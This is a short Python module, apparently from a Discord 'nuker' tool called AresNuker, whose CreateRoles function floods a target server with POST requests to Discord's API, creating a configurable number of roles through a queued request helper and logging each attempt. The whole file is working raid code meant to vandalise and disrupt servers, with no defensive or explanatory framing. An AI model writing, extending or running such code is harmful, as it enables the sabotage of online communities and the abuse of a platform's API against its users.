__import__('sys').path.append('../')
from .requests_maker import GetQ
import global_vars, requests, json
from AresNuker import Console

console = Console()
q = GetQ()

headers = global_vars.headers
config = global_vars.config
guild_id = global_vars.guild_id

def CreateRoles():
	name = config['nuke']['role_name']
	payload = {
		'name': name
	}
	role_amount = int(config['nuke']['amount_role'])
	for i in range(role_amount):
		try:
			q.put((requests.post, f'https://discord.com/api/v8/guilds/{guild_id}/roles', headers, payload))
			console.log(f"Created role {name}")
		except:
			console.log(f"Unable to create role {name}")
			continue
	q.join()

